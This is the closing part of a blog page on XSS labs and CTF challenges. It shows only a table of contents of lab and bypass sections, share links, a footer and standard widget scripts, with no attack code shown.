href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82%EF%BC%9A-7"><span class="toc-number">3.7.1.</span> <span class="toc-text">实验要求：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B%EF%BC%9A-7"><span class="toc-number">3.7.2.</span> <span class="toc-text">实验过程：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8B-DOM-XSS%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.8.</span> <span class="toc-text">存储型 DOM XSS漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82%EF%BC%9A-8"><span class="toc-number">3.8.1.</span> <span class="toc-text">实验要求：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B%EF%BC%9A-8"><span class="toc-number">3.8.2.</span> <span class="toc-text">实验过程：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass"><span class="toc-number">4.</span> <span class="toc-text">Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E5%A4%9A%E6%95%B0%E6%A0%87%E7%AD%BE%E5%92%8C%E5%B1%9E%E6%80%A7%E8%A2%AB%E7%A6%81%E6%AD%A2%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%94%BB%E5%87%BB"><span class="toc-number">4.1.</span> <span class="toc-text">大多数标签和属性被禁止的反射型XSS攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-1"><span class="toc-number">4.1.1.</span> <span class="toc-text">实验要求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-1"><span class="toc-number">4.1.2.</span> <span class="toc-text">实验过程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A6%81%E6%AD%A2%E4%BA%86%E6%89%80%E6%9C%89%E9%99%A4%E8%87%AA%E5%88%B6%E6%A0%87%E7%AD%BE%E4%BB%A5%E5%A4%96%E7%9A%84%E6%89%80%E6%9C%89%E6%A0%87%E7%AD%BE%E7%9A%84XSS%E6%94%BB%E5%87%BB"><span class="toc-number">4.2.</span> <span class="toc-text">禁止了所有除自制标签以外的所有标签的XSS攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-2"><span class="toc-number">4.2.1.</span> <span class="toc-text">实验要求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-2"><span class="toc-number">4.2.2.</span> <span class="toc-text">实验过程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%80%E6%9C%89%E4%BA%8B%E4%BB%B6%E5%92%8C-href-%E5%B1%9E%E6%80%A7%E5%9D%87%E8%A2%AB%E9%98%BB%E6%AD%A2%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8B-XSS"><span class="toc-number">4.3.</span> <span class="toc-text">所有事件和 href 属性均被阻止的反射型 XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-3"><span class="toc-number">4.3.1.</span> <span class="toc-text">实验要求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-3"><span class="toc-number">4.3.2.</span> <span class="toc-text">实验过程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%81%E8%AE%B8%E9%83%A8%E5%88%86SVG%E6%A0%87%E8%AE%B0%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="toc-number">4.4.</span> <span class="toc-text">允许部分SVG标记的反射型XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-4"><span class="toc-number">4.4.1.</span> <span class="toc-text">实验要求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-4"><span class="toc-number">4.4.2.</span> <span class="toc-text">实验过程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AFCTF-2021-BABY-CSP"><span class="toc-number">5.</span> <span class="toc-text">[AFCTF 2021]BABY_CSP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-18-Basic-%E9%97%A8%E9%85%B1%E6%83%B3%E7%8E%A9%E4%BB%80%E4%B9%88%E5%91%A2%EF%BC%9F"><span class="toc-number">6.</span> <span class="toc-text">[NSSRound#18 Basic]门酱想玩什么呢？</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://21346asz.github.io/XSS/XSS/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://21346asz.github.io/XSS/XSS/&text=XSS"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://21346asz.github.io/XSS/XSS/&title=XSS"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://21346asz.github.io/XSS/XSS/&is_video=false&description=XSS"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=XSS&body=Check out this article: https://21346asz.github.io/XSS/XSS/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://21346asz.github.io/XSS/XSS/&title=XSS"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://21346asz.github.io/XSS/XSS/&title=XSS"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://21346asz.github.io/XSS/XSS/&title=XSS"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://21346asz.github.io/XSS/XSS/&title=XSS"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://21346asz.github.io/XSS/XSS/&name=XSS&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://21346asz.github.io/XSS/XSS/&t=XSS"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
      <div class="footer-left">
        Copyright &copy;
        
        
        2025
        wArn
      </div>
      <div class="footer-right">
        <nav>
          <ul>
            <!--
          --><li><a href="/">Home</a></li><!--
        --><!--
          --><li><a href="/about/">About</a></li><!--
        --><!--
          --><li><a href="/categories/">categories</a></li><!--
        --><!--
          --><li><a href="/tags/">tags</a></li><!--
        --><!--
          --><li><a href="/search/">Search</a></li><!--
        -->
          </ul>
          <ul>
            
              <!-- 不蒜子统计 -->
              <span id="busuanzi_container_site_pv">
                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
              </span>
              <span class="post-meta-divider">|</span>
              <span id="busuanzi_container_site_uv" style='display:none'>
                      本站访客数<span id="busuanzi_value_site_uv"></span>人
              </span>
                  <script defer src="https://cn.vercount.one/js"></script>
            
          </ul>
        </nav>
      </div>
      
</footer>


    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'ctferwArn';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>

<!-- utterances Comments -->

</body>
</html>
